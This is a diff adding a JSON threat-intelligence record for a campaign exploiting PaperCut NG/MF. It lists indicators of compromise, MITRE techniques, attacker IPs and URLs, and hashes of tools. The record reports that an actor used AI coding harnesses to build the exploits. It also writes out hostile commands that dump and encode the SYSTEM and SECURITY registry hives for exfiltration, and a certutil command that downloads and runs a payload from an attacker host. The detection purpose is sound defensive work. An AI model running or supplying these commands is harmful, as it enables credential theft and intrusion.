@@ -1,0 +1,252 @@
+{
+  "malware_family": "",
+  "threat_actor": "Likely Russian-speaking malicious cyber actor (MCA), unnamed",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "A likely Russian-speaking actor used OpenAI Codex harnesses with a DeepSeek model to develop and mass-exploit PaperCut NG/MF (CVE-2026-81578, CVE-2026-82078), compromising at least 440 instances at 395 organizations in 48 countries. Post-exploitation relied on LSASS/registry hive harvesting, certutil staging, noPac and DCSync to reach Domain Admin in 12 victims, plus Ligolo-ng tunneling for persistence via 45.142.193.132 and 45.158.196.75. Detection should focus on the pc-*.hiv/pc-*.b64 staging paths, the reg save plus certutil -encode chains, Ligolo-ng agent drops under C:\\ProgramData, and PaperCut pcp_*.txt web-root artifacts indicating successful exploitation.",
+  "mitre_techniques": [
+    "T1190",
+    "T1003.001",
+    "T1003.002",
+    "T1003.003",
+    "T1003.004",
+    "T1140",
+    "T1136.002",
+    "T1098",
+    "T1550.002",
+    "T1572",
+    "T1068",
+    "T1041"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\pc-system.hiv",
+      "context": "SYSTEM registry hive staged for exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\pc-sys.hiv",
+      "context": "SYSTEM hive staged for exfil",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\pc-security.hiv",
+      "context": "SECURITY hive staged for exfil",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\pc-sec.hiv",
+      "context": "SECURITY hive staged for exfil",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\pc-sys-reg.hiv",
+      "context": "SYSTEM hive staged for exfil (alternate path)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\pc-*.b64",
+      "context": "Base64-encoded hive chunks staged for HTTP exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\ligolo-agent.exe",
+      "context": "Ligolo tunnel agent dropped for persistent access",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Ligolo-ng",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\LegitSvc\\legit-svc.exe",
+      "context": "Ligolo-ng name and path used by adversary",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\LegitSvc\\legit-svc-backup.exe",
+      "context": "Ligolo-ng name and path used by adversary",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "...\\PaperCut MF\\server\\custom\\web\\pcp_<10rand>.txt",
+      "context": "Evidence of successful exploitation of PaperCut MF",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "lsa_read.exe",
+      "context": "Rust LSA secret reader, MD5 528cd4e69ecfa5191adbcf6ef28667bf",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "save_hives.exe",
+      "context": "Registry Hive Dumper, MD5 ce870a91e8d27e8f663f0687abc60b04",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "collect_custom.exe",
+      "context": "Rust custom collector, MD5 a6437ac3d6798090a218520985d36a3f",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "lsa_collect_small.exe",
+      "context": "Rust LSA bootkey collector, MD5 fc92dfafa7aa741c5f2b9cbcf75d1d19",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "certipy.exe",
+      "context": "ADCS Abuse Tool, MD5 974decb9ff4c8f9ccb0937c96d513347",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Certipy",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "reg save HKLM\\SYSTEM \"C:\\Windows\\Temp\\pc-system.hiv\" /y & certutil -encode \"C:\\Windows\\Temp\\pc-system.hiv\" \"C:\\Windows\\Temp\\pc-system.b64\" & type \"C:\\Windows\\Temp\\pc-system.b64\"",
+      "context": "Dumps SYSTEM hive, base64 encodes it, verifies output before exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "reg save HKLM\\SECURITY \"C:\\Windows\\Temp\\pc-security.hiv\" /y & certutil -encode \"C:\\Windows\\Temp\\pc-security.hiv\" \"C:\\Windows\\Temp\\pc-security.b64\" & type \"C:\\Windows\\Temp\\pc-security.b64\"",
+      "context": "Dumps SECURITY hive, base64 encodes it, verifies output before exfiltration",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil -urlcache -split -f \"http://45.142.193[.]132:8000/lsa_collect.exe\" C:\\Windows\\Temp\\lsa_collect.exe & C:\\Windows\\Temp\\lsa_collect.exe",
+      "context": "Downloads and executes LSA bootkey collector",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Administrator17",
+      "context": "Adversary-created account added to Domain Admins",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "45.142.193.132",
+      "context": "Used to orchestrate and execute the campaign",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.158.196.75",
+      "context": "Used to execute the campaign (second execution host)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://45.142.193.132:8000/lsa_collect.exe",
+      "context": "Payload download for LSA bootkey collector",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://45.142.193.132:8089/agent5.exe",
+      "context": "URL for Ligolo-ng agent used by adversary",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Ligolo-ng"
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe"
+  ]
+}
